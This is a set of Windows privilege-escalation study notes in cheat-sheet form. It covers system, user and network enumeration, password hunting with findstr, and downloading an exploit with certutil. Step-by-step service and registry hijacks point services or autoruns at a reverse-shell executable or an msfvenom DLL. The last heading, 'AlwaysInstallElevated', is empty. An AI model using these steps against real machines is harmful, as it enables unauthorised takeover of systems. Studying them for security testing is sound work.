# Windows Privilege Escalation Notes

## Enumeration:
1. **System Enumeration:**
- `systeminfo`
- Get OS Name, OS Version, System type:    `systeminfo | findstr \B \C:"OS Name" \C:"OS Version" \C:"System Type"`
- `hostname`
- Extract Patching info using (Windows Management Insrtumentation CMD Quick Fix Engineering):    `wmic qfe`
- List Drives info:   `wmic logicaldisk get caption,description,providername`
2. **User Enumeration:**
- User Privileges:  `whoami /priv`
- List User groups:  `whoami /groups`
- List all users:  `net user`
- See User Info:   `net user <username>`
- List local groups:  `net localgroup <groupname>`
3. **Network Enumeration:**
- Network Information:  `ipconfig /all`
- List ARP Table:  `arp -a`
- Routing Table:  `route print`
- List Open Ports:  `netstat -ano`
4. **Hunting for Passwords:**
- Finding password from text or config files:  `findstr /si password *.txt *.config`
5. **AV and Firewall Enumeration:**
- List windows defender info (Service Control) : `sc query windefend`
- List all running services:  `sc queryex type=service`
- List Firewall Configurations:  `netsh advfirewall firewall dump`  OR  `netsh firewall show state` AND `netsh firewall show config`
5. **Tools:**
- WinPEAS, Windows Exploit Suggester
- Download exploit: certutil -urlcache -f "IP Addr"

# Check List and Commands:
1. Run winpeas and also download accesschk.exe.

### Service Exploits:
1. Weak/Insecure Service Permissions.
- Confirm Service Permissions using:   `accesschk.exe /accepteula -uwqcv <user> <service>`
- Check service privileges (must be runing as system):   `sc qc <service>`
- Check service status:   `sc query <service>`
- Change Config: Modify the service config and set the BINARY_PATH_NAME (binpath) to your reverse shell.exe:  `sc config <servive> binpath= "\"<PATH>""`
- Setup Listener and restart the service:   `net start <serice>`

2. Unquoted Service Path:
- Confirm Service Permissions that if you can start/stop it:   `accesschk.exe /accepteula -uwqcv <user> <service>`
- Check the service privileges:  `sc qc <service>`
- Check the permissions of the directory which has unquoted directory:  `accesschk.exe /accepteula -uwdq <path>`
- Copy the reverse shell.exe to folder that has unquoted directory.
- Setup Listener and restart the service:   `net start <serice>`

3. Weak Registry Permissions:
- Run powershell:  `powershell -ep bypass`
- Confirm the permissions:  `Get-Acl HKLM:\System\CurrentControlSet\Services\<service> | fl`
- Confirm Service Permissions that if you can start/stop it:   `accesschk.exe /accepteula -uwqcv <user> <service>`
- Check image (exe) path of the service registry:  `reg query HKLM\System\CurrentControlSet\Services\<service>`
- Change image path to your own reverse shell path:  `reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d <path> \f`
- Setup Listener and restart the service:   `net start <serice>`

4. Insecure Service Executables:
- Check the service privileges:  `sc qc <service>`
- Check if service binary (BINARY_PATH_NAME) file is writable by everyone: `accesschk.exe /accepteula -quvw "<path>"`
- Confirm Service Permissions that if you can start/stop it:   `accesschk.exe /accepteula -uwqcv <user> <service>`
- Replace the service exe with your own reverse shell.exe.
- Setup Listener and restart the service:   `net start <serice>`

5. DLL Hijacking:
- If we have write permissions to the folder where windows searches for dll.
- Download and run procmon.exe on your host machine.
- One by one copy every service executable that runs with system privilege to your host machine and run it.
- Check in procmon for any missing dll.
- Create a dll reverse shell with msfvenom and copy it to the path where a privileged process seaches for dll and we also have write access to the path
- Restart the process and capture shell.

### Registry Exploits:
1. Autoruns:
- Query the registry for AutoRun executables:  `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- Check if the AutoRun executables is writable by everyone:  `accesschk.exe /accepteula -wvu "<path>"`
- Replace the executable with reverse shell.
- Restart the machine and capture the shell.

2. AlwaysInstallElevated 
